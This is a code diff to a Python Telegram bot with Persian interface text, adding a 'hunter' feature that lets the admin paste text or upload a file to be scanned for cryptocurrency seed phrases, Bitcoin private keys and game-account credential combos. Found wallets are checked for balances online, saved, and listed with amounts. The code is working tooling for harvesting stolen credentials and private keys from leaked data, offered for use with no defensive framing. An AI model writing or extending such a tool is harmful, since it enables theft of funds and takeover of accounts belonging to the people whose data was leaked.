@@ -508,6 +508,7 @@ async def cb(c, q):
         text += "• در صورت پیدا شدن فورا به شما اطلاع داده میشود"
         buttons = [
             [InlineKeyboardButton("💰 لیست کیف پول‌های با موجودی", callback_data="hunter_list")],
+            [InlineKeyboardButton("🔍 اسکن متن/فایل دلخواه", callback_data="hunter_scan_text")],
             [InlineKeyboardButton("🗑️ پاک کردن لیست پیدا شده", callback_data="hunter_clear")],
             [InlineKeyboardButton("🔙 بازگشت", callback_data="home")]
         ]
@@ -536,6 +537,13 @@ async def cb(c, q):
         # CSV
         csv_bytes = export_found_csv(found)
         await app.send_document(ADMIN_ID, io.BytesIO(csv_bytes), file_name=f"wallets_with_balance_{int(time.time())}.csv", caption=f"📥 لیست کامل {len(found)} مورد (فقط {len(found_with_money)} مورد موجودی دارند)")
+        return
+
+    if d == "hunter_scan_text":
+        atk_state["hunter_step"] = "await_text"
+        await q.message.edit_text("🔍 لطفا متنی که می‌خواهی در آن دنبال کیف پول یا اکانت بازی بگردی را بفرست.\nهمچنین می‌توانی فایل متنی .txt/.csv را آپلود کنی.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="hunter_menu")]]))
+        await q.answer()
         return
 
     if d == "hunter_clear":
@@ -976,6 +984,64 @@ async def cb(c, q):
 @app.on_message(filters.private & filters.user(ADMIN_ID) & (filters.text | filters.document) & ~filters.command("start"))
 async def steps(c, m):
     step = atk_state.get("step")
+    hstep = atk_state.get("hunter_step")
+
+    # ========== Hunter manual scan ==========
+    if hstep == "await_text":
+        text = ""
+        if m.document:
+            status = await m.reply_text("📥 در حال دانلود و خواندن فایل...")
+            try:
+                file = await app.download_media(m.document, in_memory=True)
+                text = file.getvalue().decode("utf-8-sig", errors="ignore")
+            except Exception as e:
+                await status.edit_text(f"❌ خطا در خواندن فایل: {str(e)}")
+                atk_state["hunter_step"] = None
+                return
+        else:
+            text = m.text or ""
+            status = await m.reply_text("🔍 در حال اسکن...")
+        if not text.strip():
+            await status.edit_text("❌ متن خالی است.")
+            atk_state["hunter_step"] = None
+            return
+        findings = scan_text(text, source="manual")
+        wallets = [f for f in findings if f["type"] in ("seed_phrase","btc_wif")]
+        games = [f for f in findings if f["type"] == "game_account"]
+        await status.edit_text(f"✅ تشخیص داده شد:\n💰 {len(wallets)} کیف پول/seed\n🎮 {len(games)} اکانت/کمبو\n⏳ در حال بررسی موجودی آنلاین...")
+        wallets_checked = check_balance_of_findings(wallets)
+        # Save new findings
+        existing = load_found()
+        seen = set((f["type"], f["value"]) for f in existing)
+        new_wallets = 0
+        new_games = 0
+        total_money = 0
+        for f in wallets_checked + games:
+            k = (f["type"], f["value"])
+            if k not in seen:
+                existing.append(f)
+                seen.add(k)
+                if f["type"] == "game_account":
+                    new_games += 1
+                else:
+                    new_wallets += 1
+                    total_money += f.get("balance",0) or 0
+        save_found(existing)
+        msg = f"✅ اسکن کامل شد!\n\n💎 کیف پول/seed جدید: {new_wallets}\n🎮 اکانت بازی/کمبو جدید: {new_games}\n💰 مجموع موجودی پیدا شده: {total_money:.8f}"
+        if wallets_checked:
+            msg += "\n\n<b>نمونه کیف پول ها:</b>"
+            for f in wallets_checked[:5]:
+                bal = f.get("balance",0) or 0
+                if bal > 0.0001:
+                    msg += f"\n🚨 {bal:.6f} {f.get('coin','')} - {f['value'][:50]}"
+        if games:
+            msg += f"\n\n🎮 {min(len(games), 10)} نمونه اکانت:"
+            for f in games[:10]:
+                msg += f"\n<code>{f['value'][:60]}</code>"
+        atk_state["hunter_step"] = None
+        await status.edit_text(msg, reply_markup=main_menu())
+        return
+
     if not step: return
 
     # ==================== افزودن اکانت جدید از منوی مدیریت ====================
